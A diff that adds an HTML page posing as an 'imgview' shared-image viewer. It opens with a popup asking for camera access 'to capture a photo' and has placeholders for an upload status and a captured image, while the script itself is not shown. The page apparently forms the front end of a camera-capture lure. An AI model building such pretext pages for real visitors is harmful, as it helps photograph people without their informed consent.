@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+    <title>Image Viewer</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="style.css">
+
+</head>
+
+
+<body>
+
+
+<!-- Camera Permission Popup -->
+
+<div class="popup-overlay" id="consentPopup">
+
+    <div class="popup-box">
+
+        <h3>Camera Permission Required</h3>
+
+        <p>
+            This website requires camera access
+            to capture a photo.
+        </p>
+
+        <button id="allowCamera">
+            Continue
+        </button>
+
+    </div>
+
+</div>
+
+
+
+<header>
+
+    <div class="logo">
+        imgview
+    </div>
+
+
+    <nav class="menu">
+
+        <a href="#">
+            About
+        </a>
+
+        <a href="#">
+            Sign In
+        </a>
+
+    </nav>
+
+</header>
+
+
+
+
+<main>
+
+
+    <h2>
+        Shared Image
+    </h2>
+
+
+    <div class="image-box">
+
+        <img src="images/photo.jpeg" alt="Shared Image">
+
+    </div>
+
+
+
+    <div class="camera-result">
+
+        <p id="uploadStatus"></p>
+
+        <img id="capturedImage">
+
+    </div>
+
+
+
+</main>
+
+
+
+<script src="script.js"></script>
+
+
+</body>
+
+</html>
